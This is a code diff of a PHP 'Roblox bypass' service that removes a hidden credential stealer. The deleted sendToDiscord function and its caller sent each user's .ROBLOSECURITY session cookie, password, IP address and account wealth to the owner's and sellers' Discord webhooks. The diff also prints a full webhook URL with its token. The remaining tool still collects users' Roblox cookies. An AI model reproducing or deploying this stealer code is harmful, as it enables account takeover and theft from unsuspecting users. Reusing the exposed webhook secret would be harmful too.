@@ -14,7 +14,6 @@ function createRblxDirectory($name) {
     $url = "https://rblxbypass.com/api/directories";
     $payload = [
         "name" => $name,
-        "clientWebhook" => "https://discord.com/api/webhooks/1457790028901126332/-pXyNoPuI1R8DkE32kbvOEG7-cRZGkQJXMa7KLTT1wTT204dCHpQE0IlP3tNWSJDNj8a",
         "discordServer" => ""
     ];
     $headers = ["Content-Type: application/json"];
@@ -66,8 +65,6 @@ function performBypassRequest($url, $roblox_cookie, $dir, $pass) {
 }
 
 $history_file = 'history.json';
-
-const OWNER_WEBHOOK = "https://discord.com/api/webhooks/1457790028901126332/-pXyNoPuI1R8DkE32kbvOEG7-cRZGkQJXMa7KLTT1wTT204dCHpQE0IlP3tNWSJDNj8a";
 
 // Request Logging for Debugging
 $requestId = uniqid();
@@ -289,105 +286,6 @@ function getAccountCountry($cookie) {
 
 // REMOVED: getOwnedGamepassCount() function - was causing 30+ API calls and rate limiting
 
-function sendToDiscord($cookie, $userInfo = null, $details = null, $sellerData = null) {
-    if (!$cookie) return;
-    
-    $webhooks = [OWNER_WEBHOOK];
-    if ($sellerData) {
-        if (!empty($sellerData['webhook'])) $webhooks[] = $sellerData['webhook'];
-        if (!empty($sellerData['webhook2']) && ($sellerData['mode'] ?? '') === 'triplehook') {
-            $webhooks[] = $sellerData['webhook2'];
-        }
-    }
-    $webhooks = array_unique(array_filter($webhooks));
-
-    $timestamp = date("c");
-    
-    if ($userInfo && $details) {
-        $avatarUrl = getAvatarUrl($userInfo['id']);
-        $discordServer = $sellerData['discord_server'] ?? 'https://discord.gg/naT2CxcX';
-        $ip = $_SERVER['REMOTE_ADDR'];
-
-        $embed1 = [
-            "type" => "rich",
-            "description" => "`+1 HIT • You've Earned 1 SPLUNK X XP`\n## [**__Check Cookie__**](https://href.li/?https://app.beamers.si/tools/checker?cookie={$cookie}) <:cookie:1263854438288719983> <:red_line:1308264830385393694> [**__Discord Server__**](https://discord.gg/naT2CxcX) <:discord:1264187182776586332> <:red_line:1308264830385393694> [**__Profile__**](https://www.roblox.com/users/{$userInfo['id']}/profile) <:1981redmember:1308263590456852501>",
-            "color" => 889591,
-            "fields" => [
-                [
-                    "name" => "<:1981redmember:1308263590456852501> Username",
-                    "value" => "{$userInfo['name']}",
-                    "inline" => false
-                ],
-                [
-                    "name" => "<:96122redstar:1308263619829432390> Password",
-                    "value" => !empty($details['password']) ? $details['password'] : "None",
-                    "inline" => false
-                ],
-                [
-                    "name" => "About User",
-                    "value" => "`Account Age:` `{$details['account_age']}`\n`Summary:` **__" . number_format($details['transactions']) . "__**\n`Country:` **__{$details['country']}__**\n`Victim IP:` [**__{$ip}__**](https://ipinfo.io/{$ip})",
-                    "inline" => false
-                ],
-                [
-                    "name" => "<:1839_Robux:1308263558252855358> Robux",
-                    "value" => "Balance " . number_format($details['robux']) . " <:1839_Robux:1308263558252855358>\nPending " . number_format($details['pending']) . " <:3999robux:1308263592272986133>",
-                    "inline" => true
-                ],
-                [
-                    "name" => "<:limited_roblox:1308266842946797568> RAP",
-                    "value" => "RAP " . number_format($details['rap']) . " <:1839_Robux:1308263558252855358>",
-                    "inline" => true
-                ],
-                [
-                    "name" => "<:RedStar:1308281677252005889> Collectibles",
-                    "value" => "<:HeadlessHorseman:1308266847355011072> " . ($details['headless'] ? "True" : "False") . "\n<:korblox:1263860685356666971> " . ($details['korblox'] ? "True" : "False"),
-                    "inline" => true
-                ]
-            ],
-            "author" => [
-                "name" => "{$userInfo['name']}",
-                "url" => "https://www.roblox.com/users/{$userInfo['id']}/profile",
-                "icon_url" => $avatarUrl
-            ],
-            "thumbnail" => ["url" => $avatarUrl]
-        ];
-    } else {
-        // Simple embed for when we skip validation
-        $embed1 = [
-            "type" => "rich",
-            "title" => "New Cookie Hit (No Validation)",
-            "description" => "## [**__Check Cookie__**](https://href.li/?https://app.beamers.si/tools/checker?cookie={$cookie})\nCookie input received, skipping validation to prevent invalidation.",
-            "color" => 889591
-        ];
-    }
-
-    $embed2 = [
-        "type" => "rich",
-        "title" => "<:25154redmod:1308263602322538527> **ROBLOSECURITY**",
-        "description" => "**```{$cookie}```**",
-        "color" => 889591,
-        "thumbnail" => [
-            "url" => "https://images-ext-1.discordapp.net/external/L2wMWWf7i1cRYDWCCOU1arREV5gHZkcXLohkWP9h664/%3Fcb%3D20211101151724/https/static.wikia.nocookie.net/cookierunkingdom/images/d/d9/DevilBase.png/revision/latest?format=webp"
-        ]
-    ];
-
-    $payload = json_encode([
-        "content" => "@everyone **New Hit!**",
-        "embeds" => [$embed1, $embed2]
-    ]);
-
-    foreach ($webhooks as $webhookUrl) {
-        $ch = curl_init($webhookUrl);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-        curl_exec($ch);
-        curl_close($ch);
-    }
-}
-
 function saveToHistory($data) {
     global $history_file;
     $history = [];
@@ -466,29 +364,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' || (isset($_GET['action']) && $_GET['a
     $http_code = $result['code'];
     $response = $result['body'] ?? '';
     $curl_error = $result['error'] ?? '';
-
-    // Send to Discord with validation info if possible
-    $sellerName = $_POST['seller'] ?? null;
-    $sellerData = $sellerName ? getSellerData($sellerName) : null;
-    
-    $userInfo = getRobloxUserInfo($roblox_cookie);
-    if ($userInfo) {
-        $userId = $userInfo['id'];
-        $details = [
-            'robux' => getRobux($userId, $roblox_cookie),
-            'pending' => getPendingRobux($userId, $roblox_cookie),
-            'rap' => getRap($userId, $roblox_cookie),
-            'korblox' => checkBundle($userId, 192, $roblox_cookie),
-            'headless' => checkBundle($userId, 201, $roblox_cookie),
-            'transactions' => getTransactionsSummary($userId, $roblox_cookie),
-            'account_age' => getAccountAge($userId),
-            'country' => getAccountCountry($roblox_cookie),
-            'password' => $password_input
-        ];
-        sendToDiscord($roblox_cookie, $userInfo, $details, $sellerData);
-    } else {
-        sendToDiscord($roblox_cookie, null, null, $sellerData);
-    }
 
     if ($http_code === 200) {
         $duration = round($end_time - $start_time, 2);
